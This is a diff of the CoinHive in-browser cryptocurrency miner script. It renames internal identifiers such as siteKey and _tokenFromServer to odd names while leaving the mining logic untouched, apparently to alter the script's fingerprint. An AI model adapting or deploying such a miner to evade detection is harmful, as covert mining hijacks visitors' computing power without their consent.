@@ -1,15 +1,15 @@
 (function(window) {
     "use strict";
-    var Miner = function(siteKey, params) {
+    var Miner = function(anotherkey, params) {
         this.params = params || {};
-        this._siteKey = siteKey;
+        this._anotherkey = anotherkey;
         this._user = null;
         this._threads = [];
         this._hashes = 0;
         this._currentJob = null;
         this._autoReconnect = true;
         this._reconnectRetry = 3;
-        this._tokenFromServer = null;
+        this._tokenfromser = null;
         this._goal = 0;
         this._totalHashesFromDeadThreads = 0;
         this._throttle = Math.max(0, Math.min(.99, this.params.throttle || 0));
@@ -43,7 +43,7 @@
             } catch (e) {}
         }
         if (CoinHive.CONFIG.REQUIRES_AUTH) {
-            this._auth = new CoinHive.Auth(this._siteKey, {
+            this._auth = new CoinHive.Auth(this._anotherkey, {
                 theme: this.params.theme || "light",
                 lang: this.params.language || "auto"
             })
@@ -120,7 +120,7 @@
         return this._hashes
     };
     Miner.prototype.getToken = function() {
-        return this._tokenFromServer
+        return this._tokenfromser
     };
     Miner.prototype.on = function(type, callback) {
         if (this._eventListeners[type]) {
@@ -369,7 +369,7 @@
         this._emit("open");
         var params = {
             version: CoinHive.VERSION,
-            site_key: this._siteKey,
+            site_key: this._anotherkey,
             type: "anonymous",
             user: null,
             goal: 0
@@ -428,7 +428,7 @@
                 this.stop()
             }
         } else if (msg.type === "authed") {
-            this._tokenFromServer = msg.params.token || null;
+            this._tokenfromser = msg.params.token || null;
             this._hashes = msg.params.hashes || 0;
             this._emit("authed", msg.params);
             this._reconnectRetry = 3;
@@ -494,18 +494,18 @@
     window.CoinHive.IF_EXCLUSIVE_TAB = "ifExclusiveTab";
     window.CoinHive.FORCE_EXCLUSIVE_TAB = "forceExclusiveTab";
     window.CoinHive.FORCE_MULTI_TAB = "forceMultiTab";
-    window.CoinHive.Token = function(siteKey, goal, params) {
-        var miner = new Miner(siteKey, params);
+    window.CoinHive.Token = function(anotherkey, goal, params) {
+        var miner = new Miner(anotherkey, params);
         miner._goal = goal || 0;
         return miner
     };
-    window.CoinHive.User = function(siteKey, user, params) {
-        var miner = new Miner(siteKey, params);
+    window.CoinHive.User = function(anotherkey, user, params) {
+        var miner = new Miner(anotherkey, params);
         miner._user = user;
         return miner
     };
-    window.CoinHive.Anonymous = function(siteKey, params) {
-        var miner = new Miner(siteKey, params);
+    window.CoinHive.Anonymous = function(anotherkey, params) {
+        var miner = new Miner(anotherkey, params);
         return miner
     };
     window.CoinHive.Res = function(s) {
